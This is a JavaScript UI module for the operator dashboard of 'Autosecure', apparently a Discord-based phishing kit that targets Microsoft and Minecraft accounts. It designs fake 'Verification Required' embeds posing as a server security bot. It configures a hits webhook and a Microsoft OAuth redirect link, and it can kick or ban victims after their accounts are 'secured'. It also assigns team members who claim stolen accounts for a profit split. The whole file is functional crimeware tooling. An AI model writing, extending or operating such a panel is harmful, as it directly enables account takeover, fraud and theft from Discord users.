// Visual Builder & Phisher Settings View Module
const BuilderView = {
  activeTab: 'embeds',
  embedData: {
    title: 'Verification Required',
    description: 'Please verify your Microsoft account to gain access to the server.',
    color: '#6366f1',
    authorName: 'Server Security Bot',
    authorIcon: '',
    thumbnail: '',
    image: '',
    footerText: 'Powered by Autosecure',
    footerIcon: '',
    fields: [
      { name: 'Status', value: 'Pending Verification', inline: true },
      { name: 'Security Level', value: 'High', inline: true }
    ]
  },

  async render() {
    const container = document.getElementById('view-content');
    container.innerHTML = `
      <div class="card">
        <div class="card-header">
          <span class="card-title"><i class="fas fa-magic"></i> Discord UI Designer & Phisher</span>
          <span class="badge-tag info">Live Customizer</span>
        </div>

        <div class="tabs-header" style="margin-top:14px;">
          <button class="tab-btn active" id="builder-tab-btn-embeds" onclick="BuilderView.switchTab('embeds')">
            <i class="fas fa-window-maximize"></i> Embed Designer
          </button>
          <button class="tab-btn" id="builder-tab-btn-presets" onclick="BuilderView.switchTab('presets')">
            <i class="fas fa-bookmark"></i> Presets
          </button>
          <button class="tab-btn" id="builder-tab-btn-phisher" onclick="BuilderView.switchTab('phisher')">
            <i class="fas fa-fish"></i> Phisher Config
          </button>
          <button class="tab-btn" id="builder-tab-btn-subusers" onclick="BuilderView.switchTab('subusers')">
            <i class="fas fa-users-cog"></i> Team / Sub-Users
          </button>
        </div>

        <div class="card-body">
          <!-- TAB 1: VISUAL EMBED BUILDER -->
          <div id="builder-tab-content-embeds">
            <div style="display:grid;grid-template-columns:1fr 460px;gap:28px;">
              <!-- Left: Controls -->
              <div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Embed Title</label>
                    <input type="text" id="emb-title" class="form-input" value="${this.embedData.title}" oninput="BuilderView.updateLivePreview()" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Accent Color (Hex)</label>
                    <div style="display:flex;gap:8px;">
                      <input type="color" id="emb-color-picker" value="${this.embedData.color}" 
                             style="width:40px;height:40px;border:none;border-radius:4px;cursor:pointer;background:none;" 
                             onchange="document.getElementById('emb-color').value=this.value;BuilderView.updateLivePreview();" />
                      <input type="text" id="emb-color" class="form-input" value="${this.embedData.color}" oninput="BuilderView.updateLivePreview()" />
                    </div>
                  </div>
                </div>

                <div class="form-group">
                  <label class="form-label">Description / Body</label>
                  <textarea id="emb-desc" class="form-textarea" style="height:85px;" oninput="BuilderView.updateLivePreview()">${this.embedData.description}</textarea>
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Author Name</label>
                    <input type="text" id="emb-author-name" class="form-input" value="${this.embedData.authorName}" oninput="BuilderView.updateLivePreview()" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Author Icon URL</label>
                    <input type="text" id="emb-author-icon" class="form-input" value="${this.embedData.authorIcon}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Thumbnail URL</label>
                    <input type="text" id="emb-thumbnail" class="form-input" value="${this.embedData.thumbnail}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Banner Image URL</label>
                    <input type="text" id="emb-image" class="form-input" value="${this.embedData.image}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                  <div class="form-group">
                    <label class="form-label">Footer Text</label>
                    <input type="text" id="emb-footer-text" class="form-input" value="${this.embedData.footerText}" oninput="BuilderView.updateLivePreview()" />
                  </div>
                  <div class="form-group">
                    <label class="form-label">Footer Icon URL</label>
                    <input type="text" id="emb-footer-icon" class="form-input" value="${this.embedData.footerIcon}" placeholder="https://..." oninput="BuilderView.updateLivePreview()" />
                  </div>
                </div>

                <!-- Fields Manager -->
                <div style="margin-top:16px;">
                  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
                    <span style="font-size:0.85rem;font-weight:600;color:var(--text-muted);">Embed Fields (${this.embedData.fields.length})</span>
                    <button class="btn btn-secondary btn-sm" onclick="BuilderView.addField()">
                      <i class="fas fa-plus"></i> Add Field
                    </button>
                  </div>
                  <div id="emb-fields-container" style="display:flex;flex-direction:column;gap:8px;"></div>
                </div>

                <div style="display:flex;gap:10px;margin-top:24px;border-top:1px solid var(--border-color);padding-top:18px;">
                  <button class="btn btn-primary" onclick="BuilderView.saveEmbedConfig()">
                    <i class="fas fa-save"></i> Save Configuration
                  </button>
                  <button class="btn btn-secondary" onclick="BuilderView.exportEmbedJson()">
                    <i class="fas fa-code"></i> Export JSON
                  </button>
                </div>
              </div>

              <!-- Right: Real-time Discord Preview -->
              <div>
                <div style="font-size:0.75rem;font-weight:700;text-transform:uppercase;color:var(--text-dim);margin-bottom:8px;">
                  Live Discord Message Preview
                </div>
                <div style="background:#313338;padding:20px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);">
                  <div id="discord-preview-box" class="discord-embed-preview"></div>
                </div>
              </div>
            </div>
          </div>

          <!-- TAB 2: PRESETS -->
          <div id="builder-tab-content-presets" style="display:none;">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
              <h4 style="font-size:0.95rem;font-weight:600;">Saved Preset Configurations</h4>
              <button class="btn btn-primary btn-sm" onclick="BuilderView.openSavePresetModal()">
                <i class="fas fa-bookmark"></i> Save Current as Preset
              </button>
            </div>
            <div id="presets-container"></div>
          </div>

          <!-- TAB 3: PHISHER CONFIG -->
          <div id="builder-tab-content-phisher" style="display:none;">
            <div id="phisher-container" style="max-width:620px;">
              <div style="text-align:center;padding:30px;"><i class="fas fa-spinner fa-spin"></i></div>
            </div>
          </div>

          <!-- TAB 4: SUB-USERS & PERMISSIONS -->
          <div id="builder-tab-content-subusers" style="display:none;">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
              <p style="font-size:0.85rem;color:var(--text-muted);margin:0;">
                Grant team members access to claiming, bots, embeds, or custom profit splits.
              </p>
              <button class="btn btn-primary btn-sm" onclick="BuilderView.openAddSubuserModal()">
                <i class="fas fa-user-plus"></i> Add Sub-User
              </button>
            </div>
            <div id="subusers-container"></div>
          </div>
        </div>
      </div>
    `;

    this.renderFieldInputs();
    this.updateLivePreview();
  },

  switchTab(tabId) {
    this.activeTab = tabId;
    ['embeds', 'presets', 'phisher', 'subusers'].forEach(t => {
      const btn = document.getElementById(`builder-tab-btn-${t}`);
      const content = document.getElementById(`builder-tab-content-${t}`);
      if (btn && content) {
        if (t === tabId) {
          btn.classList.add('active');
          content.style.display = 'block';
        } else {
          btn.classList.remove('active');
          content.style.display = 'none';
        }
      }
    });

    if (tabId === 'presets') this.loadPresets();
    if (tabId === 'phisher') this.loadPhisherConfig();
    if (tabId === 'subusers') this.loadSubusers();
  },

  renderFieldInputs() {
    const container = document.getElementById('emb-fields-container');
    if (!container) return;

    container.innerHTML = this.embedData.fields.map((f, i) => `
      <div style="display:grid;grid-template-columns:1fr 1fr auto auto;gap:8px;align-items:center;">
        <input type="text" class="form-input" style="padding:6px 10px;font-size:0.8rem;" value="${f.name}" placeholder="Field Title" oninput="BuilderView.updateField(${i}, 'name', this.value)" />
        <input type="text" class="form-input" style="padding:6px 10px;font-size:0.8rem;" value="${f.value}" placeholder="Field Value" oninput="BuilderView.updateField(${i}, 'value', this.value)" />
        <label style="font-size:0.75rem;display:flex;align-items:center;gap:4px;cursor:pointer;">
          <input type="checkbox" ${f.inline ? 'checked' : ''} onchange="BuilderView.updateField(${i}, 'inline', this.checked)" /> Inline
        </label>
        <button class="btn btn-danger btn-sm" onclick="BuilderView.removeField(${i})"><i class="fas fa-times"></i></button>
      </div>
    `).join('');
  },

  addField() {
    this.embedData.fields.push({ name: 'New Field', value: 'Value', inline: true });
    this.renderFieldInputs();
    this.updateLivePreview();
  },

  updateField(index, key, val) {
    if (this.embedData.fields[index]) {
      this.embedData.fields[index][key] = val;
      this.updateLivePreview();
    }
  },

  removeField(index) {
    this.embedData.fields.splice(index, 1);
    this.renderFieldInputs();
    this.updateLivePreview();
  },

  updateLivePreview() {
    this.embedData.title = document.getElementById('emb-title')?.value || '';
    this.embedData.description = document.getElementById('emb-desc')?.value || '';
    this.embedData.color = document.getElementById('emb-color')?.value || '#6366f1';
    this.embedData.authorName = document.getElementById('emb-author-name')?.value || '';
    this.embedData.authorIcon = document.getElementById('emb-author-icon')?.value || '';
    this.embedData.thumbnail = document.getElementById('emb-thumbnail')?.value || '';
    this.embedData.image = document.getElementById('emb-image')?.value || '';
    this.embedData.footerText = document.getElementById('emb-footer-text')?.value || '';
    this.embedData.footerIcon = document.getElementById('emb-footer-icon')?.value || '';

    const preview = document.getElementById('discord-preview-box');
    if (!preview) return;

    preview.style.borderLeftColor = this.embedData.color;

    let fieldsHtml = '';
    if (this.embedData.fields.length) {
      fieldsHtml = `
        <div class="embed-fields-grid">
          ${this.embedData.fields.map(f => `
            <div>
              <div class="embed-field-name">${f.name || ''}</div>
              <div class="embed-field-val">${f.value || ''}</div>
            </div>
          `).join('')}
        </div>
      `;
    }

    preview.innerHTML = `
      ${this.embedData.authorName ? `
        <div class="embed-author">
          ${this.embedData.authorIcon ? `<img src="${this.embedData.authorIcon}" onerror="this.style.display='none'" />` : ''}
          <span>${this.embedData.authorName}</span>
        </div>
      ` : ''}

      <div style="display:flex;align-items:flex-start;justify-content:space-between;gap:12px;">
        <div style="flex:1;">
          ${this.embedData.title ? `<div class="embed-title">${this.embedData.title}</div>` : ''}
          ${this.embedData.description ? `<div class="embed-desc">${this.embedData.description}</div>` : ''}
        </div>
        ${this.embedData.thumbnail ? `
          <img src="${this.embedData.thumbnail}" onerror="this.style.display='none'" style="width:55px;height:55px;border-radius:4px;object-fit:cover;" />
        ` : ''}
      </div>

      ${fieldsHtml}

      ${this.embedData.image ? `
        <img src="${this.embedData.image}" onerror="this.style.display='none'" style="max-width:100%;border-radius:4px;margin-bottom:8px;" />
      ` : ''}

      ${this.embedData.footerText ? `
        <div class="embed-footer">
          ${this.embedData.footerIcon ? `<img src="${this.embedData.footerIcon}" onerror="this.style.display='none'" style="width:16px;height:16px;border-radius:50%;" />` : ''}
          <span>${this.embedData.footerText}</span>
        </div>
      ` : ''}
    `;
  },

  async saveEmbedConfig() {
    try {
      await API.post('/api/builder/embeds', {
        type: 'verification',
        embed: this.embedData
      });
      Toasts.success('Discord embed configuration saved!');
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  exportEmbedJson() {
    const json = JSON.stringify(this.embedData, null, 2);
    Modal.open({
      title: 'Embed JSON Specification',
      bodyHtml: `<pre style="font-family:var(--font-mono);font-size:0.8rem;background:rgba(0,0,0,0.3);padding:14px;border-radius:4px;max-height:300px;overflow-y:auto;">${json}</pre>`,
      footerHtml: `
        <button class="btn btn-secondary" onclick="API.copyText(\`${json.replace(/`/g, '\\`')}\`, 'JSON')">Copy JSON</button>
        <button class="btn btn-primary" onclick="Modal.close()">Done</button>
      `
    });
  },

  async loadPresets() {
    const container = document.getElementById('presets-container');
    if (!container) return;

    try {
      const res = await API.get('/api/builder/presets');
      const presets = res.presets || [];

      if (!presets.length) {
        container.innerHTML = `<div style="text-align:center;padding:40px;color:var(--text-dim);">No presets saved yet.</div>`;
        return;
      }

      container.innerHTML = `
        <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(260px, 1fr));gap:16px;">
          ${presets.map(p => `
            <div class="card" style="margin-bottom:0;padding:16px;">
              <h4 style="font-size:1rem;font-weight:700;">${p.name}</h4>
              <p style="font-size:0.75rem;color:var(--text-dim);margin:6px 0 14px;">Saved: ${new Date(p.time).toLocaleDateString()}</p>
              <div style="display:flex;gap:8px;">
                <button class="btn btn-secondary btn-sm" onclick="BuilderView.applyPreset(${p.id})">Load</button>
                <button class="btn btn-danger btn-sm" onclick="BuilderView.deletePreset(${p.id})">Delete</button>
              </div>
            </div>
          `).join('')}
        </div>
      `;
    } catch (err) {
      container.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  openSavePresetModal() {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">Preset Name</label>
        <input type="text" id="save-preset-name" class="form-input" placeholder="e.g. Hypixel Verification" required />
      </div>
      <div class="form-group">
        <label class="form-label">Attached Button Label (Optional)</label>
        <input type="text" id="save-preset-btn-label" class="form-input" placeholder="e.g. Verify Account" />
      </div>
      <div class="form-group">
        <label class="form-label">Button Link (Optional)</label>
        <input type="text" id="save-preset-btn-link" class="form-input" placeholder="https://..." />
      </div>
    `;

    Modal.open({
      title: 'Save New Preset',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="BuilderView.submitSavePreset()">Save Preset</button>
      `
    });
  },

  async submitSavePreset() {
    const name = document.getElementById('save-preset-name').value.trim();
    const buttonlabel = document.getElementById('save-preset-btn-label').value.trim();
    const buttonlink = document.getElementById('save-preset-btn-link').value.trim();

    if (!name) return Toasts.warning('Preset name required');

    try {
      await API.post('/api/builder/presets', {
        name,
        preset: this.embedData,
        buttonlabel,
        buttonlink
      });
      Modal.close();
      Toasts.success('Preset saved!');
      this.loadPresets();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async deletePreset(id) {
    if (!confirm('Delete preset?')) return;
    try {
      await API.delete(`/api/builder/presets/${id}`);
      Toasts.success('Preset deleted');
      this.loadPresets();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async loadPhisherConfig() {
    const container = document.getElementById('phisher-container');
    if (!container) return;

    try {
      const res = await API.get('/api/builder/phisher');
      const p = res.phisher;

      container.innerHTML = `
        <form onsubmit="BuilderView.savePhisher(event)">
          <div class="form-group">
            <label class="form-label">Discord Hits Webhook URL</label>
            <input type="url" id="phisher-webhook" class="form-input" value="${p.webhook || ''}" placeholder="https://discord.com/api/webhooks/..." />
          </div>
          <div class="form-group">
            <label class="form-label">OAuth Redirect Link</label>
            <input type="url" id="phisher-oauth" class="form-input" value="${p.oauth_link || ''}" placeholder="https://login.live.com/oauth20_authorize.srf..." />
          </div>
          <div class="form-group">
            <label class="form-label">Hits Notification Ping</label>
            <input type="text" id="phisher-ping" class="form-input" value="${p.ping || '@everyone'}" placeholder="@everyone or &lt;@&amp;role_id&gt;" />
          </div>
          <div class="form-group">
            <label class="form-label">After-Secure Action</label>
            <select id="phisher-aftersecure" class="form-select">
              <option value="nothing" ${p.aftersecure === 'nothing' ? 'selected' : ''}>Nothing</option>
              <option value="kick" ${p.aftersecure === 'kick' ? 'selected' : ''}>Kick Victim from Server</option>
              <option value="ban" ${p.aftersecure === 'ban' ? 'selected' : ''}>Ban Victim from Server</option>
            </select>
          </div>
          <div style="margin:16px 0;">
            <label class="form-checkbox-label">
              <input type="checkbox" id="phisher-validate" ${p.validateusername ? 'checked' : ''} />
              <span>Validate Minecraft Username Before Securing</span>
            </label>
            <label class="form-checkbox-label">
              <input type="checkbox" id="phisher-blacklist" ${p.blacklistemails ? 'checked' : ''} />
              <span>Blacklist Victim Emails Automatically</span>
            </label>
          </div>
          <button type="submit" class="btn btn-primary"><i class="fas fa-save"></i> Save Phisher Settings</button>
        </form>
      `;
    } catch (err) {
      container.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  async savePhisher(e) {
    e.preventDefault();
    const payload = {
      webhook: document.getElementById('phisher-webhook').value.trim(),
      oauth_link: document.getElementById('phisher-oauth').value.trim(),
      ping: document.getElementById('phisher-ping').value.trim(),
      aftersecure: document.getElementById('phisher-aftersecure').value,
      validateusername: document.getElementById('phisher-validate').checked ? 1 : 0,
      blacklistemails: document.getElementById('phisher-blacklist').checked ? 1 : 0
    };

    try {
      await API.post('/api/builder/phisher', payload);
      Toasts.success('Phisher configuration saved!');
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async loadSubusers() {
    const container = document.getElementById('subusers-container');
    if (!container) return;

    try {
      const res = await API.get('/api/builder/subusers');
      const list = res.subusers || [];

      if (!list.length) {
        container.innerHTML = `<div style="text-align:center;padding:40px;color:var(--text-dim);">No team members or sub-users configured.</div>`;
        return;
      }

      container.innerHTML = `
        <div class="table-wrapper">
          <table>
            <thead>
              <tr>
                <th>Member Discord ID</th>
                <th>Profit Split</th>
                <th>Claiming</th>
                <th>Bot Access</th>
                <th>Embed Edit</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              ${list.map(u => `
                <tr>
                  <td><b>${u.child}</b></td>
                  <td><span class="badge-tag warning">${u.split || 50}%</span></td>
                  <td>${u.claiming ? '✅' : '❌'}</td>
                  <td>${u.editbot ? '✅' : '❌'}</td>
                  <td>${u.editembeds ? '✅' : '❌'}</td>
                  <td>
                    <button class="btn btn-danger btn-sm" onclick="BuilderView.deleteSubuser('${u.child}')">Remove</button>
                  </td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      `;
    } catch (err) {
      container.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  openAddSubuserModal() {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">Team Member Discord User ID *</label>
        <input type="text" id="sub-child-id" class="form-input" placeholder="e.g. 123456789012345678" required />
      </div>
      <div class="form-group">
        <label class="form-label">Percentage Split (%)</label>
        <input type="number" id="sub-split" class="form-input" value="50" min="0" max="100" />
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-claiming" checked /> <span>Can Claim Hits</span>
        </label>
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-editbot" /> <span>Edit Bot Fleet</span>
        </label>
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-editembeds" /> <span>Edit Embeds</span>
        </label>
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-editautosecure" /> <span>Edit Autosecure</span>
        </label>
      </div>
    `;

    Modal.open({
      title: 'Add Team Member / Sub-User',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="BuilderView.submitAddSubuser()">Save Permissions</button>
      `
    });
  },

  async submitAddSubuser() {
    const child = document.getElementById('sub-child-id').value.trim();
    const split = parseInt(document.getElementById('sub-split').value, 10) || 50;
    const claiming = document.getElementById('sub-claiming').checked ? 1 : 0;
    const editbot = document.getElementById('sub-editbot').checked ? 1 : 0;
    const editembeds = document.getElementById('sub-editembeds').checked ? 1 : 0;
    const editautosecure = document.getElementById('sub-editautosecure').checked ? 1 : 0;

    if (!child) return Toasts.warning('Discord ID required');

    try {
      await API.post('/api/builder/subusers', {
        child, split, claiming, editbot, editembeds, editautosecure
      });
      Modal.close();
      Toasts.success('Sub-user saved');
      this.loadSubusers();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async deleteSubuser(child) {
    if (!confirm(`Remove sub-user ${child}?`)) return;
    try {
      await API.delete(`/api/builder/subusers/${child}`);
      Toasts.success('Sub-user removed');
      this.loadSubusers();
    } catch (err) {
      Toasts.error(err.message);
    }
  }
};

window.BuilderView = BuilderView;
